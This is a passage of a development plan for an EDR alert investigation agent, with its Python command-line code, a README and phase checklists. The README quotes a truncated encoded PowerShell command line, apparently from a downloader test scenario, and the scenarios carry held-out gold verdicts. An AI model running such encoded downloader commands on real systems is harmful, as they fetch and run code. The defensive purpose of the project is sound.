from alert2attack.knowledge.base import KnowledgeBase
from alert2attack.store.case_store import CaseStore
from alert2attack.tools import default_registry
from alert2attack.tools.context import EvidenceLedger, ToolContext

app = typer.Typer(no_args_is_help=True, add_completion=False)
scenarios_app = typer.Typer(no_args_is_help=True)
app.add_typer(scenarios_app, name="scenarios", help="List and inspect scenarios.")

RootOpt = Annotated[Path, typer.Option("--root", help="Scenario root directory")]

def _find(root: Path, scenario_id: str) -> Scenario:
    path = root / scenario_id
    if not (path / "manifest.yaml").exists():
        typer.echo(f"error: scenario '{scenario_id}' not found under {root}", err=True)
        raise typer.Exit(code=2)
    return load_scenario(path)

def _parse_kv(pairs: list[str]) -> dict[str, Any]:
    args: dict[str, Any] = {}
    for pair in pairs:
        if "=" not in pair:
            typer.echo(f"error: expected key=value, got '{pair}'", err=True)
            raise typer.Exit(code=2)
        key, raw = pair.split("=", 1)
        try:
            args[key] = json.loads(raw)
        except json.JSONDecodeError:
            args[key] = raw
    return args

@scenarios_app.command("list")
def scenarios_list(root: RootOpt = SCENARIOS_ROOT) -> None:
    """One line per scenario: id, split, origin, gold verdict, event count."""
    for s in iter_scenarios(root):
        verdict = s.gold.verdict if s.gold else "-"
        typer.echo(f"{s.scenario_id:32} {s.split:5} {s.origin:9} {verdict:20} {len(s.events):4} events")

@scenarios_app.command("show")
def scenarios_show(
    scenario_id: str,
    root: RootOpt = SCENARIOS_ROOT,
    gold: Annotated[bool, typer.Option("--gold", help="Include the held-out gold block")] = False,
) -> None:
    """Print a scenario as JSON, without gold unless --gold is passed."""
    s = _find(root, scenario_id)
    view = s if gold else s.public()
    typer.echo(view.model_dump_json(indent=2, exclude_none=True))

@app.command("tools")
def tools() -> None:
    """Print the tool schemas exactly as an LLM would receive them."""
    typer.echo(json.dumps(default_registry().openai_schemas(), indent=2))

@app.command("tool")
def tool(
    name: str,
    scenario: Annotated[str, typer.Option("--scenario", help="Scenario id to open as a case")],
    kv: Annotated[list[str] | None, typer.Argument(help="Tool arguments as key=value")] = None,
    root: RootOpt = SCENARIOS_ROOT,
) -> None:
    """Call one tool against a scenario and print the result plus the evidence ledger."""
    s = _find(root, scenario).public()
    store = CaseStore()
    store.load_case(s)
    ctx = ToolContext(
        store=store, case_id=s.scenario_id, ledger=EvidenceLedger(), knowledge=KnowledgeBase.load_default()
    )
    result = default_registry().call(ctx, name, _parse_kv(kv or []))
    typer.echo(
        json.dumps(
            {"result": result.model_dump(), "ledger": sorted(ctx.ledger.ids())},
            indent=2,
            default=str,
        )
    )
    if not result.ok:
        raise typer.Exit(code=1)
```

- [ ] Step 4: Write `README.md` (replaces the planning-stage README at the repo root)

```markdown
# alert2attack

Sourced case files from EDR alerts. An investigation agent that works an endpoint alert the way an
analyst does — process tree, command line, detection rule, "what else happened on this host" — and
writes a verdict where every claim cites a tool result.

Design: `docs/design/2026-09-09-edr-investigation-agent-design.md`.
Current phase: **1 — case store, sandboxed tools, evidence ledger** (no LLM yet).

## Run

```bash
uv sync
uv run alert2attack scenarios list
uv run alert2attack scenarios show enc_ps_downloader_001
uv run alert2attack tools
uv run alert2attack tool get_alert --scenario enc_ps_downloader_001
uv run alert2attack tool get_process_tree --scenario enc_ps_downloader_001 pid=5288 depth=3
uv run alert2attack tool decode_powershell --scenario enc_ps_downloader_001 'command_line="powershell -enc SQBFAFgA..."'
```

## Test

```bash
uv run pytest
uv run ruff check . && uv run mypy
```

## Layout

- `src/alert2attack/domain` — Pydantic models (events, alert, scenario, evidence ids). No I/O.
- `src/alert2attack/store` — SQLite `CaseStore`; refuses to load gold labels.
- `src/alert2attack/knowledge` — vendored Sigma rule(s), ATT&CK subset, PowerShell decoder.
- `src/alert2attack/tools` — the only code allowed to read the store during a run; every result is
  stamped into an `EvidenceLedger`.
- `datasets/scenarios/<id>/` — `manifest.yaml` (alert, window, gold) + `events.jsonl`.
```

- [ ] Step 5: Run tests

Run: `uv run pytest -q`
Expected: all pass.

- [ ] Step 6: Try the CLI by hand

Run: `uv run alert2attack tool get_process_tree --scenario enc_ps_downloader_001 pid=5288 depth=3`
Expected: JSON with `ancestors` pids `[4120, 3344, 1180]`, `descendants` pid `5304`, `ledger` of five ids.

- [ ] Step 7: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/cli.py tests/test_cli.py README.md
git commit -m "feat(cli): scenarios list/show, tools, tool <name> for manual investigation; README"
```

## Definition of done for Phase 1

- `uv run pytest` green; `ruff` and `mypy --strict` clean.
- Three scenarios committed, one per gold verdict class; dataset invariants test passes.
- `alert2attack tool …` can walk the downloader case end to end by hand: alert → tree → per-process events → decode → rule → technique, with the ledger showing exactly the ids returned.
- No code path from `Gold` to `CaseStore` (test-enforced).

## What Phase 2 picks up (next plan document)

OTRF importer (`alert2attack dataset build`), normalizer from OTRF flat JSON to `Event`, window boxing helper, full ATT&CK subset build script from the STIX bundle, verbatim Sigma vendoring with license file, ≈40 scenarios with gold and dev/test split, `datasets/AUTHORING.md`. Interfaces consumed: `Event`, `Scenario`, `load_scenario`, `KnowledgeBase.load(data_dir)`.
